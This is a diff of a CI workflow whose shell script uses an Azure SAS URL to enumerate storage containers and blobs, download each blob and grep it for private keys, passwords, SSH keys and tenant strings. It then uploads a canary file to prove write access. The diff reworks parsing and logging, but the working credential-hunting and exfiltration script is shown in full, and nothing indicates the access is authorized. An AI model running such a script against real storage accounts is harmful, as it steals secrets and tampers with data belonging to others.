@@ -20,19 +20,13 @@ jobs:
           BASE=${SAS%%\?*}; QS=${SAS#*\?}
           ACC=$(python3 -c "import sys;u=sys.argv[1];print('/'.join(u.split('/')[:3]))" "$BASE")
           CONT=${BASE%/*}
-          {
-            echo "acc=$ACC cont=$CONT qs_len=${#QS}"
+          { echo "acc=$ACC cont=$CONT qs_len=${#QS}"
             echo "--- account containers"
             curl -sS -m 60 "$ACC/?comp=list&$QS" -o out/containers.xml -w "acct_list=%{http_code} bytes=%{size_download}\n"
             grep -oE '<Name>[^<]+</Name>' out/containers.xml | head -30
             echo "--- container blobs"
             curl -sS -m 60 "$CONT?restype=container&comp=list&$QS" -o out/blobs.xml -w "cont_list=%{http_code} bytes=%{size_download}\n"
-            python3 - <<'PY' > out/blobs.txt 2>&1
-import re
-t=open('out/blobs.xml',errors='replace').read()
-for m in re.finditer(r'<Name>([^<]+)</Name>.*?<Content-Length>(\d+)</Content-Length>',t,re.S):
-    print(m.group(1),m.group(2))
-PY
+            tr -d '\n' < out/blobs.xml | grep -oE '<Name>[^<]+</Name><Properties>[^!]*?</Properties>' | sed -E 's#<Name>([^<]+)</Name>.*<Content-Length>([0-9]+)</Content-Length>#\1 \2#' > out/blobs.txt
             cat out/blobs.txt
             echo "--- download + inspect"
             while read -r nm sz; do
@@ -40,10 +34,10 @@ PY
               if [ "${sz:-0}" -gt 104857600 ]; then echo "SKIP_BIG $nm $sz"; continue; fi
               fn=$(echo "$nm" | tr '/' '_')
               curl -sS -m 200 -o "/tmp/$fn" "$CONT/$nm?$QS"
-              echo "dl $nm rc=$? bytes=$(wc -c < /tmp/$fn)"
+              echo "dl $nm bytes=$(wc -c < /tmp/$fn)"
               tar tzf "/tmp/$fn" 2>/dev/null | head -40
               grep -aoE 'ssh-(rsa|ed25519) [A-Za-z0-9+/=]{20,}' "/tmp/$fn" 2>/dev/null | head -5
-              strings -n 12 "/tmp/$fn" 2>/dev/null | grep -aE 'BEGIN [A-Z ]*PRIVATE KEY|password|t19|tenant' | head -10
+              strings -n 12 "/tmp/$fn" 2>/dev/null | grep -aE 'BEGIN [A-Z ]*PRIVATE KEY|password=|t19|tenant' | head -10
             done < out/blobs.txt
             echo "--- canary put"
             curl -sS -m 60 -X PUT --data-binary "hk-$(date -u +%FT%TZ)" -H "x-ms-blob-type: BlockBlob" -w "put=%{http_code}\n" "$CONT/hk-canary.txt?$QS"
